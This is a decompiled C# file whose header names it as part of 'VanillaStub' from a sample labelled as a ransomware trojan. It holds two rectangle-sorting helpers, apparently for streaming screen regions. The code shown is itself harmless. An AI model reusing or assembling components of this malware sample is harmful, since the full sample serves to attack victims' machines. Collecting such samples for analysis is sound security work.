// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.Extensions
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System.Collections.Generic;
using System.Drawing;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public static class Extensions
  {
    public static SortedList<int, SortedList<int, Rectangle>> RectanglesTo2D(
      this Rectangle[] rects)
    {
      SortedList<int, SortedList<int, Rectangle>> sortedList = new SortedList<int, SortedList<int, Rectangle>>();
      for (int index = 0; index < rects.Length; ++index)
      {
        if (!sortedList.ContainsKey(rects[index].Y))
          sortedList.Add(rects[index].Y, new SortedList<int, Rectangle>());
        if (!sortedList[rects[index].Y].ContainsKey(rects[index].X))
          sortedList[rects[index].Y].Add(rects[index].X, rects[index]);
      }
      return sortedList;
    }

    public static SortedList<int, SortedList<int, Rectangle>> Rectangle2DToRows(
      this SortedList<int, SortedList<int, Rectangle>> Rects)
    {
      SortedList<int, SortedList<int, Rectangle>> sortedList1 = new SortedList<int, SortedList<int, Rectangle>>();
      for (int index1 = 0; index1 < Rects.Values.Count; ++index1)
      {
        SortedList<int, SortedList<int, Rectangle>> sortedList2 = sortedList1;
        Rectangle rectangle1 = Rects.Values[index1].Values[0];
        int y1 = rectangle1.Y;
        if (!sortedList2.ContainsKey(y1))
        {
          SortedList<int, SortedList<int, Rectangle>> sortedList3 = sortedList1;
          rectangle1 = Rects.Values[index1].Values[0];
          int y2 = rectangle1.Y;
          SortedList<int, Rectangle> sortedList4 = new SortedList<int, Rectangle>();
          sortedList3.Add(y2, sortedList4);
        }
        SortedList<int, SortedList<int, Rectangle>> sortedList5 = sortedList1;
        rectangle1 = Rects.Values[index1].Values[0];
        int y3 = rectangle1.Y;
        SortedList<int, Rectangle> sortedList6 = sortedList5[y3];
        rectangle1 = Rects.Values[index1].Values[0];
        int x1 = rectangle1.X;
        if (!sortedList6.ContainsKey(x1))
        {
          SortedList<int, SortedList<int, Rectangle>> sortedList7 = sortedList1;
          rectangle1 = Rects.Values[index1].Values[0];
          int y4 = rectangle1.Y;
          SortedList<int, Rectangle> sortedList8 = sortedList7[y4];
          rectangle1 = Rects.Values[index1].Values[0];
          int x2 = rectangle1.X;
          Rectangle rectangle2 = Rects.Values[index1].Values[0];
          sortedList8.Add(x2, rectangle2);
        }
        Rectangle rectangle3 = Rects.Values[index1].Values[0];
        for (int index2 = 1; index2 < Rects.Values[index1].Values.Count; ++index2)
        {
          Rectangle rectangle4 = Rects.Values[index1].Values[index2];
          Rectangle rectangle5 = sortedList1[rectangle3.Y].Values[sortedList1[rectangle3.Y].Count - 1];
          if (rectangle5.IntersectsWith(new Rectangle(rectangle4.X - 1, rectangle4.Y, rectangle4.Width, rectangle4.Height)))
          {
            sortedList1[rectangle3.Y][rectangle5.X] = new Rectangle(rectangle5.X, rectangle5.Y, rectangle5.Width + rectangle3.Width, rectangle5.Height);
            rectangle3 = Rects.Values[index1].Values[index2];
          }
          else
          {
            rectangle3 = Rects.Values[index1].Values[index2];
            SortedList<int, SortedList<int, Rectangle>> sortedList9 = sortedList1;
            rectangle1 = Rects.Values[index1].Values[0];
            int y5 = rectangle1.Y;
            sortedList9[y5].Add(rectangle3.X, rectangle3);
          }
        }
      }
      return sortedList1;
    }
  }
}
